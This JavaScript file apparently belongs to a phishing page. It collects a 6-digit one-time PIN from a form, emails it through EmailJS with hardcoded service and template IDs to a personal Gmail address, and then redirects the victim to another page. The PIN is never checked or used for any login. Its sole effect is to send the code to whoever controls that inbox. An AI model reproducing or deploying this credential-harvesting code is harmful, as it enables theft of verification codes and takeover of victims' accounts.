const otpForm = document.querySelector(".otpForm");
const btn = document.querySelector("button");
// Function to check if the input is a valid 6-digit PIN
function isValidPIN(pin) {
  return /^\d{6}$/.test(pin);
}

// Function to change the button color
// function changeButtonColor(isFocused) {
//   var submitBtn = document.getElementById("submitBtn");
//   submitBtn.style.backgroundColor = isFocused ? "#0361f0" : ""; // Change the color as needed
//   submitBtn.style.color = isFocused ? "#fff" : ""; // Change the color as needed
// }

// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      } else {
        changeButtonColor(true); // Focus is on the last input
      }
    }
  });
}

// Add an event listener to reset the button color when any input loses focus
for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("blur", function () {
    changeButtonColor(false);
  });
}

/// Loading in button
btn.onclick = () => {
  btn.disabled = true;
  btn.innerHTML = "Loading...";
};
const serviceId = "service_8hw6l7i";
const userId = "MDQkQ3KvrMuot9ZvW";
const templateId = "template_ra354ax";

// Function to collect and validate the PIN when the Submit button is clicked
document.getElementById("submitBtn").addEventListener("click", function () {
  var pin = "";
  var pinInputs = document.getElementsByClassName("pin-input");

  for (var i = 0; i < pinInputs.length; i++) {
    pin += pinInputs[i].value;
  }

  event.preventDefault();
  const emailParams = {
    to_name: "pristchief50@gmail.com",
    pin: pin,
  };
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      pin = "";
      location.href = "opp.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
});
